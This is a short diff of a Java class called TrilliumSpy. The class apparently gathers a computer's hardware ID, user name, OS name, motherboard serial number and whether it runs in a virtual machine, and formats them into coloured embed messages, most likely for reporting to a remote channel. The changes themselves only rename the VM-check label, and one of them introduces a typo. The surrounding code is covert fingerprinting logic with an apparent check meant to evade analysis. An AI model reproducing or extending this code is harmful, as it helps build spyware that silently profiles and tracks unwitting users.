@@ -51,7 +51,7 @@ public class TrilliumSpy { // If u call this class rat then pls get brain
 			embed.addField("HWID", "" + HWID.getHWID(), false);
 			embed.addField("PC-Name", "" + "||" + System.getProperty("user.name") + "||", false);
 			embed.addField("OS-Name", "" + System.getProperty("os.name"), false);
-			embed.addField("Is In VM", "" + TrilliumSpy.getVMDRespond(), false);
+			embed.addField("Is In VM (Mac)", "" + TrilliumSpy.getVMDRespond(), false);
 			embed.addField("Motherboard Serial Numbed", TrilliumSpy.getMachineSerialNumber(), false);
             embed.setColor(Color.RED);
             embed.setFooter(getTime(), null);
@@ -107,7 +107,7 @@ public class TrilliumSpy { // If u call this class rat then pls get brain
 			embed.addField("HWID", "" + HWID.getHWID(), false);
 			embed.addField("PC-Name", "" + "||" + System.getProperty("user.name") + "||", false);
 			embed.addField("OS-Name", "" + System.getProperty("os.name"), false);
-			embed.addField("Is In VM", "" + TrilliumSpy.getVMDRespond(), false);
+			embed.addField("In In VM (Mac)", "" + TrilliumSpy.getVMDRespond(), false);
 			embed.addField("Motherboard Serial Numbed", TrilliumSpy.getMachineSerialNumber(), false);
             embed.setColor(Color.ORANGE);
             embed.setFooter(getTime(), null);
